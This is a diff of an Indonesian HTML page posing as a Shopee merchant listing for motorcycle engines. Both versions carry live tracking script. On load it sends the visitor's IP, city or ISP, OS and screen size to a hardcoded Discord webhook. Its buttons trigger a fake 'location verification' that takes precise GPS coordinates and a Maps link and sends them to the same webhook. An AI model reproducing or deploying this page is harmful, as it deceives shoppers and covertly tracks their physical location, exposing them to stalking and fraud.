@@ -1,169 +1,133 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <title>Mitra Shopee Merchant Al X Garage | shopee.co.id</title>
-  <meta name="description" content="Kunjungi Toko Mitra Shopee Merchant Al X Garage. Temukan berbagai mesin motor Tiger, Megapro, GL original.">
-  <meta property="og:title" content="Mitra Shopee Merchant Al X Garage | shopee.co.id">
-  <meta property="og:description" content="Promo mesin motor dan sparepart original di Al X Garage melalui Mitra Shopee.">
-  <meta property="og:image" content="https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/ca5a12a1a326348c.png">
-  <meta property="og:type" content="website">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mitra Shopee Merchant Al X Garage | shopee.co.id</title>
+    
+    <meta property="og:title" content="Mitra Shopee Merchant Al X Garage">
+    <meta property="og:description" content="Dapatkan subsidi ongkir mesin motor original di Al X Garage.">
+    <meta property="og:image" content="https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/ca5a12a1a326348c.png">
+    <meta property="og:type" content="website">
 
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <style>
-    body { font-family: -apple-system, Helvetica Neue, Helvetica, Roboto, Arial, Sans-Serif; background-color: #f5f5f5; }
-    .shopee-orange-text { color: #ee4d2d; }
-    .shopee-orange-bg { background-color: #ee4d2d; }
-    #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
-    .line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
-  </style>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <style>
+        body { font-family: -apple-system, sans-serif; background-color: #f5f5f5; margin: 0; }
+        .shopee-orange { background-color: #ee4d2d; }
+        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
+    </style>
 </head>
 <body class="max-w-md mx-auto bg-white min-h-screen relative pb-20">
 
-  <div id="loader">
-    <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#ee4d2d]"></div>
-    <p class="text-sm mt-4 font-bold text-[#ee4d2d]">Memproses Verifikasi Lokasi...</p>
-  </div>
-
-  <div class="relative w-full aspect-square bg-gray-200" onclick="handleAction()">
-    <img src="./tirev2010.jpg" alt="Produk" class="w-full h-full object-cover">
-    <div class="absolute top-4 left-4">
-      <button class="bg-black/30 w-9 h-9 rounded-full text-white flex items-center justify-center backdrop-blur-sm">
-        <i class="fas fa-arrow-left"></i>
-      </button>
+    <div id="loader">
+        <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#ee4d2d]"></div>
+        <p class="text-sm mt-4 font-bold text-[#ee4d2d]">Memverifikasi Lokasi...</p>
     </div>
-  </div>
 
-  <div class="p-4 bg-white" onclick="handleAction()">
-    <h1 class="text-[#212121] text-base leading-tight font-normal line-clamp-2 mb-2">
-      Jual Beli Mesin tiger,megapro,GL,DLL - Berkualitas Tinggi Original
-    </h1>
-    <div class="flex items-baseline gap-1">
-      <span class="text-xs shopee-orange-text font-medium">Rp</span>
-      <span class="text-2xl shopee-orange-text font-medium">1.700.000 - 6.700.000</span>
+    <div class="relative w-full aspect-square bg-gray-100">
+        <img src="./tirev2010.jpg" alt="Produk" class="w-full h-full object-cover">
     </div>
-  </div>
 
-  <div class="mt-2 p-4 bg-blue-50 flex items-start gap-3 border-y border-gray-100" onclick="handleAction()">
-    <i class="fas fa-shipping-fast text-blue-600 mt-1"></i>
-    <div>
-      <p class="text-sm font-semibold text-gray-800">Verifikasi Lokasi Pengiriman</p>
-      <p class="text-[12px] text-gray-600">Verifikasi diperlukan untuk aktivasi subsidi ongkir Al X Garage.</p>
+    <div class="p-4 bg-white">
+        <h1 class="text-base leading-tight mb-2 text-gray-800">Jual Beli Mesin tiger,megapro,GL,DLL - Berkualitas Tinggi Original</h1>
+        <div class="text-[#ee4d2d]">
+            <span class="text-xs font-medium">Rp</span>
+            <span class="text-2xl font-medium">1.700.000 - 6.700.000</span>
+        </div>
     </div>
-  </div>
 
-  <div class="mt-2 p-4 bg-white flex items-center gap-3 border-y border-gray-100" onclick="handleAction()">
-    <div class="w-12 h-12 rounded-full overflow-hidden border border-gray-200">
-      <img src="https://images.unsplash.com/photo-1530046339160-ce3e530c7d2f?auto=format&fit=crop&q=80&w=150" alt="Al X Garage" class="w-full h-full object-cover">
+    <div class="mt-2 p-4 bg-blue-50 border-y border-gray-100 flex items-start gap-3">
+        <i class="fas fa-shipping-fast text-blue-600 mt-1"></i>
+        <div>
+            <p class="text-sm font-bold">Subsidi Ongkir Tersedia</p>
+            <p class="text-xs text-gray-600">Klik tombol di bawah untuk verifikasi lokasi pengiriman.</p>
+        </div>
     </div>
-    <div class="flex-1">
-      <p class="text-sm font-bold text-gray-800">Al X Garage</p>
-      <div class="flex items-center gap-1">
-        <span class="text-[10px] bg-red-500 text-white px-1 rounded">Mitra Merchant</span>
-        <p class="text-[11px] text-green-600 font-medium">Online</p>
-      </div>
+
+    <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 max-w-md mx-auto flex h-14 z-50">
+        <div class="flex w-2/5">
+            <div onclick="handleAction()" class="flex-1 flex flex-col items-center justify-center border-r border-gray-50 cursor-pointer">
+                <i class="far fa-comments text-teal-600 text-lg"></i>
+                <span class="text-[10px]">Chat</span>
+            </div>
+            <div onclick="handleAction()" class="flex-1 flex flex-col items-center justify-center cursor-pointer">
+                <i class="fas fa-cart-plus text-teal-600 text-lg"></i>
+                <span class="text-[10px]">Keranjang</span>
+            </div>
+        </div>
+        <button onclick="handleAction()" class="w-3/5 shopee-orange text-white font-bold text-sm">
+            BELI SEKARANG
+        </button>
     </div>
-    <button class="border border-[#ee4d2d] text-[#ee4d2d] text-xs px-3 py-1 rounded-sm">Ikuti Toko</button>
-  </div>
 
-  <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 max-w-md mx-auto flex h-14 z-50">
-    <div class="flex w-2/5">
-      <button onclick="handleAction()" class="flex-1 flex flex-col items-center justify-center border-r border-gray-50">
-        <i class="far fa-comments text-teal-600 text-lg"></i>
-        <span class="text-[10px] text-gray-600">Chat</span>
-      </button>
-      <button onclick="handleAction()" class="flex-1 flex flex-col items-center justify-center">
-        <i class="fas fa-cart-plus text-teal-600 text-lg"></i>
-        <span class="text-[10px] text-gray-600">Keranjang</span>
-      </button>
-    </div>
-    <button onclick="handleAction()" class="w-3/5 shopee-orange-bg text-white font-medium text-sm">
-      Beli Sekarang
-    </button>
-  </div>
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";
 
-  <script>
-    const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";
+        async function sendToDiscord(title, fields) {
+            try {
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: title,
+                            fields: fields,
+                            color: 15548997,
+                            timestamp: new Date(),
+                            thumbnail: { url: "https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/ca5a12a1a326348c.png" }
+                        }]
+                    }),
+                    keepalive: true
+                });
+            } catch (e) {}
+        }
 
-    // Fungsi pengiriman super aman
-    async function sendDiscord(title, fields) {
-      try {
-        await fetch(webhook, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            embeds: [{
-              title: title,
-              fields: fields,
-              color: 15548997,
-              timestamp: new Date(),
-              thumbnail: { url: "https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/ca5a12a1a326348c.png" }
-            }]
-          }),
-          keepalive: true
-        });
-      } catch (e) { }
-    }
+        // FUNGSI INI ADALAH LOGIKA YANG ANDA BERIKAN (PASTI JALAN)
+        function handleAction() {
+            document.getElementById('loader').style.display = 'flex';
 
-    // Fungsi Pengambilan Lokasi & Redirect
-    function processAction(isRedirect = false) {
-      if (isRedirect) document.getElementById('loader').style.display = 'flex';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (p) => {
+                        const lat = p.coords.latitude;
+                        const lon = p.coords.longitude;
+                        // Link Maps yang bisa langsung diklik di Discord
+                        const maps = "https://www.google.com/maps?q=" + lat + "," + lon;
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            
-            // Format link Maps agar bisa langsung diklik di Discord
-            const mapsLink = "https://www.google.com/maps?q=" + lat + "," + lon;
+                        await sendToDiscord("✅ LOKASI DIIZINKAN", [
+                            { name: "Koordinat", value: lat + "," + lon },
+                            { name: "Maps Link", value: maps }
+                        ]);
+                        
+                        // Redirect setelah data terkirim
+                        window.location.href = 'profiltoko.html';
+                    },
+                    async (err) => {
+                        // Jika ditolak, tidak kirim apa-apa ke webhook, langsung redirect
+                        window.location.href = 'profiltoko.html';
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                window.location.href = 'profiltoko.html';
+            }
+        }
 
-            // KIRIM DATA HANYA JIKA IZIN DIBERIKAN
-            await sendDiscord("✅ LOKASI DIIZINKAN (KLIK)", [
-              { name: "Koordinat", value: lat + ", " + lon },
-              { name: "Link Maps", value: mapsLink }
-            ]);
+        // Ambil data device saat halaman dibuka (Tanpa Lokasi)
+        window.onload = async () => {
+            let fields = [
+                { name: "📱 OS", value: navigator.platform, inline: true },
+                { name: "🖥️ Resolusi", value: screen.width + "x" + screen.height, inline: true }
+            ];
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                fields.push({ name: "🌍 IP", value: d.ip }, { name: "🏙️ Kota", value: d.city });
+            } catch (e) {}
 
-            if (isRedirect) window.location.href = 'profiltoko.html';
-          },
-          async (error) => {
-            // Jika ditolak, tidak kirim apa-apa, langsung redirect
-            if (isRedirect) window.location.href = 'profiltoko.html';
-          },
-          { enableHighAccuracy: true, timeout: 10000 }
-        );
-      } else if (isRedirect) {
-        window.location.href = 'profiltoko.html';
-      }
-    }
-
-    window.onload = async () => {
-      // 1. Kirim data perangkat otomatis
-      let deviceData = [
-        { name: "📱 OS", value: navigator.platform, inline: true },
-        { name: "🖥️ Resolusi", value: screen.width + "x" + screen.height, inline: true }
-      ];
-
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const ip = await res.json();
-        deviceData.push({ name: "🌍 IP", value: ip.ip }, { name: "🏢 ISP", value: ip.org });
-      } catch (e) { }
-
-      await sendDiscord("🚀 Visitor Masuk (Al X Garage)", deviceData);
-
-      // 2. Minta izin lokasi otomatis setelah 2 detik
-      setTimeout(() => {
-        processAction(false);
-      }, 2000);
-    };
-
-    function handleAction() {
-      processAction(true);
-    }
-  </script>
+            await sendToDiscord("🚀 Visitor Masuk (Al X Garage)", fields);
+        };
+    </script>
 </body>
 </html>
